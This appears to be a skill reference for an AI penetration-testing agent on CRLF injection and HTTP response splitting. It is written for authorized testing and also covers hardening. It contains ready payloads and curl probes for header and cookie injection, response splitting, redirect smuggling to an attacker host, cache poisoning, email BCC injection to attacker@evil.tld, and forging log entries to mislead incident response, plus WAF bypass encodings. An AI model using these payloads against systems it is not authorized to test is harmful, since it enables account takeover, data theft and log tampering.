---
name: CRLF Injection
description: Reference for CRLF injection / HTTP response splitting covering header injection, cookie smuggling, log forging, redirect smuggling, and parser-differential probes.
---

# CRLF Injection

Reference for finding CRLF (`\r\n`) injection gaps in headers, redirects, and log lines. Pull this in when input flows into HTTP response headers (`Location`, `Set-Cookie`, custom headers) or into log files / mail headers without sanitization. Distinct from request smuggling (which is a transport-layer length / chunked-encoding desync).

> Black-box scope: probes drive HTTP and observe whether the response includes attacker-injected headers / second responses. Modern HTTP servers strip CR/LF in many contexts; the bug class lives in the gaps.

## Tool wiring

| Action | Tool | Notes |
|---|---|---|
| Single probe | `execute_curl -i` | Use `--data-urlencode` or raw `%0d%0a` to avoid shell mangling. |
| Header position fuzz | `execute_code` | Iterate over candidate parameters. |
| Inspect raw response (find injected lines) | `kali_shell` | `nc target.tld 80` then `printf 'GET ...\r\n\r\n' | nc` for full byte-level view. |

## Encoding cheat sheet

```
\r       0x0D    %0D    %0d
\n       0x0A    %0A    %0a
\r\n     0x0D 0x0A    %0D%0A   %0d%0a   %5cr%5cn  (slash-encoded)
```

Variants servers may decode differently:

```
%0a              (LF only; many parsers accept)
%0d              (CR only)
%E5%98%8A%E5%98%8D    (UTF-8 overlong; legacy bypass on some Java/.NET stacks)
%u000d%u000a     (IIS-style Unicode)
```

## Injection points

| Surface | Header constructed |
|---|---|
| Redirect after login | `Location: /next?u=$INPUT` |
| Open redirect / OAuth | `Location: $INPUT` |
| Set-Cookie based on input | `Set-Cookie: pref=$INPUT` |
| Custom header echo | `X-Request-Id: $INPUT` |
| Reflected canonical link | `Link: <https://...>; rel="$INPUT"` |
| WAF / CDN custom headers | `X-Edge-Trace: $INPUT` |
| Log line entries | App writes user input into log file |
| Mail headers | `Subject: $INPUT`, `From: $INPUT` (email injection) |

## Probe matrix

### Detection probes

```
execute_curl url: "https://target.tld/redirect?url=foo%0d%0aX-Pwn:%20yes" -i
# Look for X-Pwn: yes in the response headers
```

```
execute_curl url: "https://target.tld/preferences?theme=dark%0d%0aSet-Cookie:%20admin=true" -i
# Look for Set-Cookie: admin=true added to the response
```

```
execute_curl url: "https://target.tld/api/lookup?id=1%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<h1>injected</h1>" -i
# If the raw socket shows two HTTP responses, response splitting is live
```

### Captured-traffic workflow (proxy_brain tools)

If HTTP Traffic Capture is enabled, source and drive this from the recorded history (proxy_brain only see traffic that crossed the capture proxy).

- `redamon.params` surfaces the params that build `Location` / `Set-Cookie` / custom headers (the injectable positions).
- `redamon.fuzz id "url" ["foo%0d%0aX-Pwn:%20yes","foo%0aX-Pwn:%20yes","foo%E5%98%8A%E5%98%8DX-Pwn:%20yes"]` iterates the CRLF variant set over one captured QUERY param, watching per-payload status and length for the response that grew an extra header.
- For body or header positions (redamon.fuzz only drives a query param), `redamon.replay id mutate:{param:{"url":"foo%0d%0aSet-Cookie:%20admin=true"}}` mutates the param and lets you inspect the response headers for the injected `X-Pwn` / `Set-Cookie`.
- `redamon.grep "X-Pwn"` confirms the injected header actually surfaced in a captured response.

### Variant probes

```
%0d%0aX-Pwn:%20yes                       (canonical CRLF)
%0aX-Pwn:%20yes                          (LF-only; Apache / nginx behavior differs)
%0dX-Pwn:%20yes                          (CR-only; old IIS)
%0d%0a%0d%0a<html>...                    (full response splitting)
%0d%0a Set-Cookie:%20a=b                 (folded-line continuation)
%E5%98%8A%E5%98%8D                       (UTF-8 overlong; legacy)
```

### Cookie smuggling

```
execute_curl url: "https://target.tld/setpref?value=foo%0d%0aSet-Cookie:%20session=ATTACKER_SESSION" -i
# If the response sets the attacker's session cookie, victim is signed into attacker's account.
```

Pair with login CSRF (see `/skill csrf`) for a complete take-over chain.

### Open-redirect smuggling via CRLF

When the redirect URL is sanitized but CRLF is not:

```
GET /go?u=https://target.tld/safe%0d%0aLocation:%20https://attacker.tld
```

Response constructs:

```
Location: https://target.tld/safe
Location: https://attacker.tld
```

Some browsers honor the last `Location`. Pair with `/skill open_redirect`.

### Cache poisoning via CRLF

When the injected header poisons cache key behavior:

```
GET /search?q=foo%0d%0aVary:%20X-Custom%0d%0aCache-Control:%20max-age=86400
```

If the server emits the injected `Vary` and `Cache-Control`, attacker controls cache behavior. Pair with `/skill web_cache_poisoning`.

### Email header injection (`From`, `Subject`, `BCC`)

When user input flows into an email send:

```
contact form: name = "Alice%0d%0aBCC:%20attacker@evil.tld"
```

The mail message includes a BCC to the attacker. Probe by:

```
execute_curl url: "https://target.tld/contact" method: "POST" data: "name=Alice%0d%0aBcc%3A+attacker%40evil.tld&message=hi"
```

(Confirm by checking attacker mailbox or interactsh-fronted SMTP receiver.)

### Log forging

```
GET /login?username=admin%0d%0a2024-01-01%2010:00:00%20[INFO]%20Successful%20login%20by%20admin
```

The injected line forges a log entry. Useful for:

- Hiding the attacker's actual log line (truncation via newline).
- Inserting false events that mislead incident response.
- Triggering log-parser bugs (e.g. JSON injection into structured logs).

## Bypass techniques

### WAF strips `\r\n` literal

```
%0d%0a                 -> stripped
%E5%98%8A%E5%98%8D     -> UTF-8 overlong (sometimes accepted)
\r\n  (literal in JSON)-> some WAFs only inspect URL-decoded forms
```

### Header-name parsing differentials

```
X-Test:%20a%0d%0aX-Pwn:%20b
```

Apache may treat the entire string as a single header value; nginx may split. The application sees one variant, the proxy sees another.

### Per-context CRLF

| Context | Effective char |
|---|---|
| HTTP headers | `\r\n` |
| Email | `\r\n` (RFC 5322) |
| LDAP filter strings | `\(` and `\)` (different escape; not CRLF) |
| Log lines (custom) | `\n` only |
| JSON (when re-parsed) | `\\n` (escaped) |

The key insight: an input that lands in **two** layers may need different escapes for each. Probe the layer that does NOT escape.

## Validation shape

A clean CRLF finding includes:

1. The exact request URL / parameter / body.
2. The injected payload (URL-encoded form).
3. Raw response capture showing the injected header / second-response / cookie.
4. Browser confirmation (when the bug affects redirects or cookies).
5. The bypass class (canonical / LF-only / UTF-8 overlong / cookie smuggling / cache-key poisoning / email injection / log forging).

## False positives

- The injected `\r\n` is URL-encoded by the server before being placed in headers; final response shows literal `%0d%0a`.
- Server uses a structured-header API that rejects CR/LF before construction (e.g. Go `http.Header.Set` rejects newlines, recent Java `HttpServletResponse.setHeader` does too).
- The header is set but stripped by an intermediate proxy / CDN.
- Reflected-but-not-trusted: the response contains the literal `\r\n` but it is rendered in a body, not parsed as headers.

## Hardening summary

- Use header APIs that reject CR/LF on input. Modern Go, Java, Node, .NET all default to rejection -- but custom code that builds headers via string concatenation is still common.
- Validate input strictly when it flows into headers, redirect URLs, log lines, or email fields. Allow only `[A-Za-z0-9._~/-]` for paths, narrow charset for headers.
- Use CSP `script-src 'self'` to limit damage from response-splitting-based XSS.
- Add `X-Content-Type-Options: nosniff` so injected `Content-Type` doesn't change interpretation.
- Wrap structured logging through a library that escapes newlines automatically.
- For email forms, use a library (`zeep`, `smtplib` with explicit headers) that constructs the message envelope from validated fields, never from raw user input.

## Hand-off

```
CRLF -> XSS via splitting              -> built-in xss skill
CRLF -> cookie smuggling -> ATO         -> /skill csrf, /skill jwt_attacks
CRLF -> open redirect chain             -> /skill open_redirect
CRLF -> cache poisoning chain           -> /skill web_cache_poisoning
Email header injection                  -> file as Mail Injection (separate from CRLF)
Log forging                             -> /skill information_disclosure (incident response confusion)
```

## Pro tips

- Many modern HTTP libraries reject CR/LF in headers. The bug class is most alive in:
  - Custom proxy / WAF rules that build headers via strings.
  - Older language stacks (PHP < 5.5, classic ASP, certain Java versions).
  - Email send paths (less hardened than HTTP-side).
  - Structured-log writers that don't escape newlines.
- LF-only payloads (`%0a`) often slip past filters that look for the `\r\n` pair.
- UTF-8 overlong CRLF encodings (`%E5%98%8A%E5%98%8D`) still work on a surprising number of legacy stacks.
- The cleanest PoC is a paired raw socket capture (`curl -v` or `nc`) that visibly shows the injected line.
- For OAuth flows, CRLF in `redirect_uri` can chain into open redirect + token theft. Pivot to `/skill oauth_oidc`.
